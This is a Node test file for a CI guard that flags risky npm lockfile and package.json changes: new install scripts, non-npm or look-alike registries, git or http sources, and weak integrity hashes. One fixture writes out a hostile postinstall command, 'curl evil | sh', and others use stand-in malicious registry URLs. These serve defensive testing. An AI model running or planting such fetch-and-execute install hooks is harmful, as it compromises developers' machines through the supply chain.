// node --test "scripts/ci/*.test.mjs"   Fixtures are built in temp dirs so no stray package-lock.json lives in the repo.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { check, validateAllowlist } from './install-scripts-guard.mjs';

const INT = 'sha512-' + 'A'.repeat(86) + '==';
const pkg = (name, version, extra = {}) => ({ version, resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`, integrity: INT, ...extra });
const lockOf = (deps) => ({ lockfileVersion: 3, packages: { '': { name: 'designer' }, 'packages/desktop': { name: '@designer/desktop' }, 'node_modules/@designer/desktop': { resolved: 'packages/desktop', link: true }, ...Object.fromEntries(Object.entries(deps).map(([n, e]) => [`node_modules/${n}`, e])) } });
function tree(lock, { rootScripts, wsScripts } = {}) {
  const d = mkdtempSync(join(tmpdir(), 'guard-'));
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify(lock));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'designer', workspaces: ['packages/*'], scripts: rootScripts ?? { build: 'x' } }));
  mkdirSync(join(d, 'packages/desktop'), { recursive: true });
  writeFileSync(join(d, 'packages/desktop/package.json'), JSON.stringify({ name: '@designer/desktop', scripts: wsScripts ?? { start: 'electron .' } }));
  return d;
}
const allow = [{ name: 'esbuild', reason: 'build tool; postinstall only verifies its binary' }];

test('a clean lockfile, unchanged from base, passes', () => {
  const l = lockOf({ left: pkg('left', '1.0.0'), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) });
  const r = check({ baseDir: tree(l), headDir: tree(l), allowlist: allow });
  assert.deepEqual(r.problems, []);
});

test('a NEW package with an install script that is not allowlisted fails', () => {
  const base = lockOf({ left: pkg('left', '1.0.0') });
  const head = lockOf({ left: pkg('left', '1.0.0'), sketchy: pkg('sketchy', '1.0.0', { hasInstallScript: true }) });
  const r = check({ baseDir: tree(base), headDir: tree(head), allowlist: allow });
  assert.equal(r.problems.length, 1);
  assert.match(r.problems[0], /sketchy@1\.0\.0 was added or changed and has an install script/);
});

test('a version bump of an existing script-bearing package that is not allowlisted fails; allowlisted passes', () => {
  const base = lockOf({ sketchy: pkg('sketchy', '1.0.0', { hasInstallScript: true }), esbuild: pkg('esbuild', '0.28.1', { hasInstallScript: true }) });
  const head = lockOf({ sketchy: pkg('sketchy', '1.0.1', { hasInstallScript: true }), esbuild: pkg('esbuild', '0.28.2', { hasInstallScript: true }) });
  const r = check({ baseDir: tree(base), headDir: tree(head), allowlist: allow });
  assert.equal(r.problems.length, 1);
  assert.match(r.problems[0], /sketchy@1\.0\.1/);
  assert.ok(r.notes.some((n) => n.startsWith('esbuild@0.28.2')));
});

test('an existing package that GAINS an install script in a patch release fails', () => {
  const base = lockOf({ left: pkg('left', '1.0.0') });
  const head = lockOf({ left: pkg('left', '1.0.1', { hasInstallScript: true }) });
  assert.match(check({ baseDir: tree(base), headDir: tree(head), allowlist: allow }).problems[0], /left@1\.0\.1/);
});

test('a lockfile entry from a non-npm registry, a git URL, plain http, or without integrity fails', () => {
  const base = lockOf({});
  for (const [why, entry, re] of [
    ['other registry', pkg('evil', '1.0.0', { resolved: 'https://registry.evil.example/evil/-/evil-1.0.0.tgz' }), /not https:\/\/registry\.npmjs\.org/],
    ['look-alike host', pkg('evil', '1.0.0', { resolved: 'https://registry.npmjs.org.evil.example/evil.tgz' }), /not https:\/\/registry\.npmjs\.org/],
    ['git dependency', pkg('evil', '1.0.0', { resolved: 'git+ssh://git@github.com/x/evil.git#abc' }), /not https/],
    ['plain http', pkg('evil', '1.0.0', { resolved: 'http://registry.npmjs.org/evil/-/evil-1.0.0.tgz' }), /not https/],
    ['no integrity', { version: '1.0.0', resolved: 'https://registry.npmjs.org/evil/-/evil-1.0.0.tgz' }, /integrity/],
    ['sha1 integrity', pkg('evil', '1.0.0', { integrity: 'sha1-abcdefabcdefabcdefabcdef=' }), /integrity/],
    ['no resolved', { version: '1.0.0', integrity: INT }, /no "resolved"/],
  ]) {
    const r = check({ baseDir: tree(base), headDir: tree(lockOf({ evil: entry })), allowlist: allow });
    assert.ok(r.problems.some((p) => re.test(p)), `${why}: ${JSON.stringify(r.problems)}`);
  }
});

test('workspace links and bundled files are not treated as registry downloads', () => {
  const l = lockOf({ left: pkg('left', '1.0.0') });
  l.packages['node_modules/left/node_modules/inner'] = { version: '1.0.0', inBundle: true };
  assert.deepEqual(check({ baseDir: tree(l), headDir: tree(l), allowlist: allow }).problems, []);
});

test('a new postinstall in the root or a workspace package.json fails; unchanged ones pass', () => {
  const l = lockOf({});
  assert.deepEqual(check({ baseDir: tree(l, { wsScripts: { postinstall: 'node a.js' } }), headDir: tree(l, { wsScripts: { postinstall: 'node a.js' } }), allowlist: allow }).problems, []);
  const r1 = check({ baseDir: tree(l), headDir: tree(l, { rootScripts: { build: 'x', postinstall: 'curl evil | sh' } }), allowlist: allow });
  assert.match(r1.problems[0], /^designer#postinstall is new or changed/);
  const r2 = check({ baseDir: tree(l), headDir: tree(l, { wsScripts: { prepare: 'node x.js' } }), allowlist: allow });
  assert.match(r2.problems[0], /^@designer\/desktop#prepare is new or changed/);
  const ok = check({ baseDir: tree(l), headDir: tree(l, { wsScripts: { prepare: 'node x.js' } }), allowlist: [...allow, { name: '@designer/desktop#prepare', reason: 'reviewed: builds the shell' }] });
  assert.deepEqual(ok.problems, []);
});

test('allowlist entries need a name and a real reason', () => {
  assert.deepEqual(validateAllowlist([{ name: 'a', reason: 'long enough reason' }]), []);
  assert.equal(validateAllowlist([{ name: 'a' }]).length, 1);
  assert.equal(validateAllowlist([{ reason: 'long enough reason' }]).length, 1);
  assert.equal(validateAllowlist([{ name: 'a', reason: 'ok' }]).length, 1);
  assert.equal(validateAllowlist({}).length, 1);
});

test('the real repository lockfile passes against itself with the checked-in allowlist', async () => {
  const { readFileSync } = await import('node:fs');
  const list = JSON.parse(readFileSync(new URL('./install-scripts-allowlist.json', import.meta.url), 'utf8'));
  const root = new URL('../..', import.meta.url).pathname;
  assert.deepEqual(check({ baseDir: root, headDir: root, allowlist: list }).problems, []);
});
